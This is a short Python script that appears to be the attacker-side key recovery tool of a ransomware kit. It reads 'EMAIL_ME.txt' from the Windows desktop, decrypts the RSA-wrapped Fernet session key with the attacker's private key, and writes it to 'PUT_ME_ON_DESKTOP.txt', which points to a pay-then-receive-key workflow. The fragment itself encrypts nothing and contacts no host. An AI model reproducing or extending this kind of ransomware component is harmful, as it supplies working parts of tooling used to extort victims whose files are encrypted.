from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import winreg, os


key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders')
desktop =  winreg.QueryValueEx(key, "Desktop")[0]  

with open(os.path.join(desktop, 'EMAIL_ME.txt'), 'rb') as f:
    enc_fernet_key = f.read()
    #print(enc_fernet_key)

# Private RSA key
private_key = RSA.import_key(open('private.pem').read())

# Private decrypter
private_crypter = PKCS1_OAEP.new(private_key)

# Decrypted session key
dec_fernet_key = private_crypter.decrypt(enc_fernet_key)
with open(os.path.join(desktop, 'PUT_ME_ON_DESKTOP.txt'), 'wb') as f:
    f.write(dec_fernet_key)

#print(f'> Private key: {private_key}')
#print(f'> Private decrypter: {private_crypter}')
#print(f'> Decrypted fernet key: {dec_fernet_key}')
#print('> Decryption Completed')

